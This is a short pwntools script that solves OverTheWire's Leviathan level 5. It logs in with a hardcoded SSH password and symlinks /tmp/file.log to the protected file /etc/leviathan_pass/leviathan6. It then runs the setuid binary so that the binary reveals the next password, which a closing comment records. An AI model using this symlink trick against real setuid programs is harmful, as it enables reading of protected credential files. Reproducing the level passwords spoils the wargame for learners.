from pwn import *
shell = ssh('leviathan5', 'leviathan.labs.overthewire.org',
        password='Tith4cokei')
sh = shell.run('bash')
log.info(sh.recv(timeout=5).decode())
#####################################

sh.sendline('ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log; ./leviathan5')
log.success(sh.recv(timeout=5).decode())
#sh.sendline('')
#log.success(sh.recv(timeout=5).decode())


#pass UgaoFee4li
